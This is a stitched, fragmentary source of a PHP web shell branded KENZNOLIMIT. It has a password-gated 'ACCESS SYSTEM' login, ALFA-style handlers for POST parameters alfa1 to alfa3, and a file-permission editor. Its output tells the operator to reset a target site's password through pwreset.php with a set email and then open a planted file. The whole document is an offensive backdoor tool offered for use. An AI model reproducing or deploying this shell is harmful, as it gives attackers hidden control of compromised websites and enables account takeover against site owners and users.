...
h2{
  ...
  background: linear-gradient(90deg,#ff0000,#8400ff);
...
<div class="signin <?php if(isset($_POST['pass']) && md5($_POST['pass']) != $GLOBALS['password']) echo 'shake'; ?>">

  <h2>KENZNOLIMIT</h2>

  <form method="post">
    <input type="password" name="pass" placeholder="Enter Access Key">
    <button type="submit">ACCESS SYSTEM</button>
  </form>

  <?php
  if(isset($_POST['pass']) && md5($_POST['pass']) != $GLOBALS['password']){
    echo "<div class='error'>ðŸš« MAU MASUK BUKAK NANA DULU YA ? ðŸš«</div>";
  }
  ?>
...
<div class="footer">
  Â© 2026 KENZNOLIMIT â€” AI SECURITY CORE
</div>
...
function draw(){
  ...
  gradient.addColorStop(1,"#8400ff");
...
$delimiter = (!empty($_POST['alfa1']) ? $_POST['alfa1'] : '::');$selected_data = json_decode($_POST['alfa2'], true);
$username = ($_POST['alfa3']);
					...
					<table>
					   <tbody>
					      ...
					      <tr>
					         ...
					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td><td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
					      </tr>
					      <tr>
					         <td>Permission</td>
...
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><fontcolor=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
}}}}
